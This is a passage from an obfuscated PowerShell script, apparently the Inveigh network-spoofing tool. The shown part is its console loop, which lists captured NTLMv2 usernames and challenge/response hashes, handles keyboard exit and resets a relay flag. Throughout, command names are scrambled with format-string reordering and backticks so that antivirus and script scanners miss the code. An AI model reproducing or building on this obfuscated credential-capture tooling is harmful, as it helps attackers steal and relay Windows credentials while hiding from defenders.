                    &("{1}{0}{2}" -f'u','Write-Outp','t')(("$(Get-Date -format 's') - Current NTLMv2 IP addresses and usernames: ") + ${in`V`eIGH}."n`e`WliNE")

                    foreach(${nTlmV2_u`SEr`Name} in ${In`Ve`Igh}."ntlMV2_U`se`RN`AME_l`IsT")
                    {
                        &("{1}{0}{3}{2}"-f 'i','Wr','utput','te-O')(${nt`LM`V`2_use`RNa`Me} + ${INVE`Igh}."NE`WLIne")
                    }
                
                }
                else
                {
                    &("{2}{1}{0}" -f 'e-Output','it','Wr')(("$(Get-Date -format 's') - No NTLMv2 challenge/response hashes have been captured ") + ${IN`VeIgh}."NeW`LI`NE")
                }

                ${CONsoLe_sT`ATuS_S`Top`Wat`Ch} =  ( &("{1}{0}"-f'Em','It')  ("vAriABl"+"e"+":y"+"Ub6"))."v`AlUe"::("{0}{1}" -f'Star','tNew').Invoke()

            }

            if(${i`N`VEigh}."cO`NSOLE_i`NPut")
            {

                if( (  &('Gi') ('Va'+'R'+'IabLe:y2'+'n'+'o'))."v`AlUE"::"KeyavA`i`L`ABLe")
                {
                    ${I`Nv`eIgH}."Cons`OLE_`ou`TPUT" = ${fA`lse}
                    BREAK ("{0}{1}{2}"-f 'co','nsole_l','oop')
                }
        
            }

            &("{2}{0}{1}"-f 'rt-','Sleep','Sta') -m 5
        }

    }

}
finally
{

    if(${t`Ool} -eq 2)
    {
        ${INV`e`Igh}."rE`l`Ay_r`Un`NiNg" = ${F`AlsE}
    }

}

}